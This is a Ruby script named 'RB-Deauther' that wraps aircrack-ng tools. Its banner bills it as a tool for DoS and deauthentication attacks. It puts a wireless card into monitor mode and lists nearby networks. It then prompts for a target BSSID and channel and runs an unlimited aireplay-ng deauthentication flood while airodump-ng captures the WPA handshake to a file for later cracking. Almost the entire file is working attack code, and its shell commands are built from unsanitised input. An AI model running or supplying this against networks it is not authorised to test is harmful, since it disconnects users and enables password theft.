#!/usr/bin/env ruby
require 'colorize'

UP_CHAR="\x1B[1F"



def banner
    ruby = "RB-D_auth3r"
    font = "slant"
    cmd = `figlet -f #{font} "#{ruby}"`.colorize(:red)
    puts cmd
    puts "[[=RB-Deauther V-1.0]=]".colorize(:yellow)
    puts "[[=Created by Genius]=]".colorize(:yellow)
    puts "[[=RB-Deauther for DOS attacks/Deauthentication]=]".colorize(:yellow)
    puts "[[=https://github.com/Salvatore-droid]=]".colorize(:yellow)
    puts asterisk
end

def asterisk
    puts "*".colorize(:blue)*100
end

def start(interface)
    print "Enter 'start' to begin attack process: ".colorize(:cyan)
    start = gets.chomp
    if start == "quit"
        puts "exiting system..!!".colorize(:red)
        sleep 1
        exit 0
    end
    check = `sudo airmon-ng check kill 2>&1`
    wlan_mon = `sudo airmon-ng start #{interface} 2>&1`
    if start == "start"
        check
        wlan_mon
        if $?.exitstatus == 0
            puts "Starting system in monitor mode..!!".colorize(:green)
            sleep(1)
        else
            puts "loading please wait..!!".colorize(:magenta)
            sleep(2)
        end
    else 
        puts "Error: Invalid input!!".colorize(:red)
        sleep 1
        exit 0
    end
end

def deauthentication(command)
    Thread.new do 
        begin
            system(command)
        rescue => e
            puts "Thread Error:#{e.message}".colorize(:red)
        end
    end
end


def dump(intermon, interface)
    puts "\nNOTE: Enter (ctrl+c) keys to stop listing the networks".colorize(:yellow)
    print "Enter 'dump' to list available networks: ".colorize(:cyan)
    list = gets.chomp
    if list == "quit"
        puts "exiting system..!!".colorize(:red)
        sleep 1
        exit 0
    end
    if list == "dump"
        interfaces = `sudo airmon-ng 2>&1`
        if interfaces.include?("#{interface}")||interfaces.include?("#{intermon}")
            UP_CHAR
            system("sudo airodump-ng #{intermon}")

            if $?.exitstatus == 0
                print "Command excecuted successfully!!\n".colorize(:green)
            else
                print "Error during command excecution!!\n".colorize(:red)
            end
        else
            puts "interfaces #{interface} and #{intermon} do not exist".colorize(:red)
            puts interfaces
        end
    else
        puts "Invalid input!".colorize(:red)
        sleep 1
        exit 0
    end
    
end

def install_ruby
    `sudo apt-get install ruby-full`
end

def check_ruby
    `ruby -v`
end

def start_up
    check = check_ruby
    if check
        puts "Initializing System boot up..!!".colorize(:green)
        sleep 3
    else
        puts "Installing Ruby..!!".colorize(:magenta)
        install_ruby
    end
end

def main
    start_up
    banner
    puts "Enter quit to exit\n".colorize(:blue)
    sleep 2
    interfaces = `sudo airmon-ng`
    system("sudo airmon-ng")
    print "Enter interface name to proceed: ".colorize(:cyan)
    interface = gets.chomp
    intermon = "#{interface}mon"
    if interface == "quit"
        puts "exiting system..!!".colorize(:red)
        sleep 1
        exit 0
    end
    if interfaces.include?("#{interface}")||interfaces.include?("#{intermon}")
        start(interface)
        dump(intermon, interface)
        print "Enter target BSSID to attack: ".colorize(:cyan)
        target = gets.chomp
        if target == "quit"
            puts "exiting system..!!".colorize(:red)
            sleep 1
            exit 0
        end
        puts "Setting up attack preparations for target BSSID #{target}..!!".colorize(:yellow)
        sleep(3)
        print "Set file name for storage of handshake captured: ".colorize(:cyan)
        file_name = gets.chomp
        if file_name == "quit"
            puts "exiting system..!!".colorize(:red)
            sleep 1
            exit 0
        end
        print "Enter Channel(CH) number of Target: ".colorize(:cyan)
        channel = gets.chomp    
        if channel == "quit"
            puts "exiting system..!!".colorize(:red)
            sleep 1
            exit 0
        end
        print "\nNOTE: Enter (ctrl+c) to terminate the process\n".colorize(:yellow)
        sleep 2
        command1 = "sudo airodump-ng -w #{file_name} -c #{channel} --bssid #{target} #{intermon}"
        command2 = "sudo aireplay-ng --deauth 0 -a #{target} #{intermon}"
        airodump_thread = deauthentication(command1)
        aireplay_thread = deauthentication(command2)
        airodump_thread.join
        aireplay_thread.join
    else
        puts "Wrong interface..!!".colorize(:red)
        sleep 2
        puts "exiting system..!!".colorize(:red)
        sleep 1
        exit 0
    end
end 


main